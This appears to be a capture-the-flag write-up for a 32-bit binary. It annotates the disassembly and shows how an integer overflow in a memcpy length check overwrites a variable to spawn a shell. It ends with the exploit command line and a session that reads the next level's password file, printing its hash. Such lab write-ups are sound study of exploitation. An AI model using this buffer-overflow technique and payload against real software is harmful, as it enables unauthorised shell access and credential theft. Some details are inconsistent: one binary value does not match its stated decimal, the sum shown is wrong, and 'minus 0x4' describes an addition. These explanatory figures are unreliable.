# 

```asm
08048424 <main>:
 8048424:	55                   	push   ebp
 8048425:	89 e5                	mov    ebp,esp
 8048427:	83 e4 f0             	and    esp,0xfffffff0
 804842a:	83 ec 40             	sub    esp,0x40
 804842d:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 8048430:	83 c0 04             	add    eax,0x4
 8048433:	8b 00                	mov    eax,DWORD PTR [eax]
 8048435:	89 04 24             	mov    DWORD PTR [esp],eax
 8048438:	e8 23 ff ff ff       	call   8048360 <atoi@plt>
 804843d:	89 44 24 3c          	mov    DWORD PTR [esp+0x3c],eax
```
- ebp+0xc is argv and dereferencing it minus 0x4 means argv[1]
- atoi is called on argv[1] and the result is stored at [esp+0x3c] as a DWORD (32 bits)

```asm
 8048441:	83 7c 24 3c 09       	cmp    DWORD PTR [esp+0x3c],0x9
 8048446:	7e 07                	jle    804844f <main+0x2b>
 8048448:	b8 01 00 00 00       	mov    eax,0x1
 804844d:	eb 54                	jmp    80484a3 <main+0x7f>
```
- Jump to next instructions if number is smaller or equal to 9
- Otherwise, exit status is 1 and jump to end of main

```asm
 804844f:	8b 44 24 3c          	mov    eax,DWORD PTR [esp+0x3c]
 8048453:	8d 0c 85 00 00 00 00 	lea    ecx,[eax*4+0x0]
 804845a:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804845d:	83 c0 08             	add    eax,0x8
 8048460:	8b 00                	mov    eax,DWORD PTR [eax]
 8048462:	89 c2                	mov    edx,eax
 8048464:	8d 44 24 14          	lea    eax,[esp+0x14]
 8048468:	89 4c 24 08          	mov    DWORD PTR [esp+0x8],ecx
 804846c:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 8048470:	89 04 24             	mov    DWORD PTR [esp],eax
 8048473:	e8 a8 fe ff ff       	call   8048320 <memcpy@plt>
```
- ebp+0xc then dereferenced and added 0x8 means argv[2]
- memcpy is called with the destination buffer at [esp+0x14], the source buffer at argv[2], and the size at [esp+0x3c] * 4, so the size is 4 times the number given as argument
- destination buffer is 0x3c-0x14 bytes, so 40 bytes

```asm
 8048478:	81 7c 24 3c 46 4c 4f 	cmp    DWORD PTR [esp+0x3c],0x574f4c46
 804847f:	57 
 8048480:	75 1c                	jne    804849e <main+0x7a>
 8048482:	c7 44 24 08 00 00 00 	mov    DWORD PTR [esp+0x8],0x0
 8048489:	00 
 804848a:	c7 44 24 04 80 85 04 	mov    DWORD PTR [esp+0x4],0x8048580
 8048491:	08 
 8048492:	c7 04 24 83 85 04 08 	mov    DWORD PTR [esp],0x8048583
 8048499:	e8 b2 fe ff ff       	call   8048350 <execl@plt>
```
- If the number is equal to 0x574f4c46, a shell is opened, but the number is <= 9 at this point
- The only way to override the number with the 0x574f4c46 value is with the memcpy call on the buffer
- the bytes we want to cpy on destination are after the buffer of 40bytes (41th, 42th, 43th and 44th), but the number is <= 9 so number*4 is <= 36, so we can only cpy on the buffer of 40 bytes, not after it

## The trick

The sign bit of a 32 bits integer is the most significant bit, so if a negative number is multiplied by 4 the negative sign bit is shifted out of the 32 bits making the number positive

```
        |                32 bits                |
before = 1000 0000 0000 0000 0000 0000 0000 0001 = -2147483647
after  = 0000 0000 0000 0000 0000 0000 0000 0010 = 2
```
- A number multiplied by 2 for instance
- We can use this trick to bypass the <=9 check and cpy the argv[2] on the number variable
- We can use every number which is negative and when multiplied by 4 gives a number bigger than 36

```
        |                32 bits                |
after  = 0000 0000 0000 0000 0000 0000 0011 1100 = 4 + 8 + 16 + 32             = 60 
before = 1000 0000 0000 0000 0000 0000 0000 1111 = -2147483638 + 1 + 2 + 4 + 8 = -2147483623
```

```shell
~$ ./bonus1 -2147483623 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```